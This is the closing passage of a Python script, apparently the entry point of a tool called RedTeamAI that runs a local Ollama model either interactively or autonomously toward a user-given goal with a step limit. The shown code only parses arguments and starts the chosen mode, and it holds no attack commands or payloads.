    parser.add_argument("--model",     default=DEFAULT_MODEL, help=f"Ollama model name (default: {DEFAULT_MODEL})")
    parser.add_argument("--auto",      metavar="GOAL",        help="Run in autonomous mode with this goal")
    parser.add_argument("--max-steps", type=int, default=15,  help="Max autonomous steps (default: 15)")
    args = parser.parse_args()

    ai = RedTeamAI(model=args.model)
    ai.max_auto_steps = args.max_steps

    if args.auto:
        ai.run_auto(args.auto)
    else:
        ai.run_interactive()


if __name__ == "__main__":
    main()
